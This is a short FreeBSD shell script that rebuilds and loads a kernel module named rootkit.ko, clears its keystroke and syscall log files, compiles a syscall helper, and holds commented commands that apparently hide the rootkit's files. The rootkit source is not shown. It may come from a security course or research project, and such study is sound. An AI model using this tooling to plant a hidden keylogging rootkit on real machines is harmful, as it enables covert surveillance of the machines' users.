#!/bin/sh
clear

rm /etc/trivial/syscall_number.txt
rm /etc/trivial/keystrokes.txt

#./syscall $sys_num 0


kldunload ./rootkit.ko
make clean
make
kldload ./rootkit.ko

cd ../interact/
cc syscall.c -o syscall

# ./add.sh syscall_number.txt
# ./setflags.sh syscall_number.txt 01
# ./add.sh trivial
# ./setflags.sh trivial 01
# ./add.sh keystrokes.txt
# ./setflags.sh keystrokes.txt 01